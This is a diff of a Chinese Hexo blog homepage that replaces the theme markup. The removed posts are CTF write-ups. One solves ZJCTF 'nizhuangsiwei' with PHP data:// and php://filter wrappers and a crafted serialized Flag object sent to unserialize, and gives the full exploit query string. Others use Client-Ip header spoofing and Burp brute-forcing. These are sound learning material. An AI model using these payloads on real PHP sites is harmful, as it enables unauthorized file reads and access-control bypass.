@@ -1,1851 +1,208 @@
-<!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh-CN">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="Hexo, NexT" />
-
-
-
-
-
-
-
-
-
-
-<meta property="og:type" content="website">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>榉橡的博客</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
 <meta property="og:title" content="榉橡的博客">
 <meta property="og:url" content="http://example.com/index.html">
 <meta property="og:site_name" content="榉橡的博客">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/null">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '',
-    scheme: 'Muse',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
+<meta name="twitter:image" content="http://example.com/null"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
     },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
     }
-  };
-</script>
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-03-13 07:58:46'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
-  <link rel="canonical" href="http://example.com/"/>
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
-
-
-
-
-  <title>榉橡的博客</title>
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-
-
-
-
-
-
-
-
-<meta name="generator" content="Hexo 5.3.0"></head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
-  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-  
-
-  <div class="container sidebar-position-left 
-  page-home">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">榉橡的博客</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-        <li class="menu-item menu-item-home">
-          <a href="/%20" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            Home
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about/%20" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            About
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
-            
-            Tags
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/%20" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            Categories
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/%20" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            Archives
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
-</nav>
-
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-  <section id="posts" class="posts-expand">
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/11/nizhuangsiwei/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="榉橡的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/03/11/nizhuangsiwei/" itemprop="url">nizhuangsiwei</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-11T09:16:18+08:00">
-                2021-03-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>进入界面，是一个显示的PHP代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>首先用Get传入text，file，password</p>
-<p>file_get_contents（）,读取一个文本内容，查询官方示例，可知file_get_contents（）也可以读取url，</p>
-<p>这时就可用php伪协议内容</p>
-<p>一，</p>
-<p>​    data://协议</p>
-<p>​    text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p>
-<p>二，</p>
-<p>​     php://协议</p>
-<p>​    text=php://input</p>
-<p>​    post数据：welcome to the zjctf</p>
-<p>$file 不能传入含有flag的值</p>
-<p>   先查看一下 的useless.php的源码</p>
-<p>  file=php://filter/read=convert.base64-encode/resource=useless.php</p>
-<p>得到源码，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKX sgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQT FoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo&#x3D;</span><br></pre></td></tr></table></figure>
-<p>经过base64解码得到</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
-<p>这一段代码是输出$flag这个参数代表文件的内容</p>
-<p>有其中的注释，我们可以猜测这个文件应该是flag.php</p>
-<p>所以我们要在主页面里引入这个类，并且这个类中的$file 为flag.php;</p>
-<p>如果让主界面的$file 为useless.php</p>
-<p>此时的代码等价于</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>此时的类Flag就导入了主要代码中，</p>
-<h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><p>在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p>
-<p>可以序列化一个$file = flag.php的Flag类，再将它放到主代码中去执行；</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>;    <span class="comment">//Amazing   !!!!! </span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>输出的是</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
-<p>将此作为$password的值</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>结束查看页面源代码，OK。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/02/%E6%9D%82%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="榉橡的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/03/02/%E6%9D%82%E8%AE%B0/" itemprop="url">杂记</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-02T09:26:01+08:00">
-                2021-03-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Robots-txt"><a href="#Robots-txt" class="headerlink" title="Robots.txt"></a>Robots.txt</h1><p>robots.txt文件是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它  。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的<strong>第一个文件</strong>。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。</p>
-<p>查看</p>
-<p>在url后面加上/robots.txt</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/02/%E5%90%88%E5%A4%A9web%E5%91%A8%E8%AE%AD/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="榉橡的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/03/02/%E5%90%88%E5%A4%A9web%E5%91%A8%E8%AE%AD/" itemprop="url">合天web周训</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-02T09:24:54+08:00">
-                2021-03-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="第一周-神奇的磁带"><a href="#第一周-神奇的磁带" class="headerlink" title="第一周  神奇的磁带"></a>第一周  神奇的磁带</h2><pre><code>     查看源代码，发现一个路径，打开后是一个乱码，保存到本地及内容是 逗你玩
-</code></pre>
-<p>​        发现存在提交窗口，用Burp抓包，<img src="https://img-blog.csdnimg.cn/20200818161008430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x1c2h1YWliYW8=,size_16,color_FFFFFF,t_70#pic_center" alt="img"></p>
-<p>​        cookie处存在base64编码，解码</p>
-<p><img src="https://img-blog.csdnimg.cn/20200818161449988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x1c2h1YWliYW8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>在提交窗口提交解码后的编码，OK,OK</p>
-<p>返回一个谜语</p>
-<p>​    <img src="https://img-blog.csdnimg.cn/20200818162456120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x1c2h1YWliYW8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>联系题目，答案：磁带 （type）</p>
-<p>OK 得到一个路径，进行访问</p>
-<p><img src="https://img-blog.csdnimg.cn/20200818161835527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x1c2h1YWliYW8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>宝塔镇河妖（bdzhy）</p>
-<p>OK,可以访问一个新的路径</p>
-<p><img src="https://img-blog.csdnimg.cn/2020081816201820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x1c2h1YWliYW8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>查看源代码，需要提交一个两位数字串，很明显用brup爆破即可 （66）</p>
-<p><img src="https://img-blog.csdnimg.cn/20200818162219818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x1c2h1YWliYW8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>提交66,查看源代码，得到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20200818162310771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x1c2h1YWliYW8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="第二周-就差一把钥匙"><a href="#第二周-就差一把钥匙" class="headerlink" title="第二周   就差一把钥匙"></a>第二周   就差一把钥匙</h2><p>查看网页的robots.txt 文件，发现存在/console路径</p>
-<p><img src="https://img-blog.csdnimg.cn/20200806111314566.png" alt="在这里插入图片描述"></p>
-<p>访问路径</p>
-<p><img src="https://img-blog.csdnimg.cn/20200806111410268.png" alt="在这里插入图片描述"></p>
-<p>进行IP伪造</p>
-<p>在提交头处写入Client-Ip:  127.0.0.1    ( XFF)</p>
-<p><img src="https://img-blog.csdnimg.cn/20200806113940902.png" alt="在这里插入图片描述"></p>
-<h2 id="第三周-迷了路"><a href="#第三周-迷了路" class="headerlink" title="第三周 | 迷了路"></a>第三周 | 迷了路</h2><p>查看源代码，未发现疑点</p>
-<p><img src="https://img-blog.csdnimg.cn/20200831215404374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pfeF95dWFu,size_16,color_FFFFFF,t_70" alt="img"></p>
-<p>联想到下方的不同的国旗，应该是需要改变网页的语言，可能和HTTP请求头的accept-language有关</p>
